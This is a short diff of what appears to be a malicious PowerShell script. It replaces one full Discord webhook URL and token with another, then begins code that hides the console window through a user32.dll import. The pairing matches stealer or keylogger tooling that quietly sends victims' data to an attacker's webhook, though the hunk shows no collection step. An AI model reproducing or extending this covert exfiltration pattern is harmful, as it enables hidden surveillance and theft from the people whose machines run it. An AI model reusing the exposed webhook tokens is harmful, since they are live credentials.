@@ -1,4 +1,4 @@
-$hookurl = "https://discord.com/api/webhooks/1272816579792343061/gE4w-05wzzqPEwFYGo_ob49IDyxxAkM-rmhRgXg6ydA1WoqXQWEmkzoIkp8roP5d6r6K"
+$hookurl = "https://discordapp.com/api/webhooks/1326948573534748765/EJ_G5Ns-EQZBlV6f3V-ymusxTnjmPEju8i-1H2gpcCJ_LH83sM60NOtAT9cse-bcF5oy"
 
 # Hide the console
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
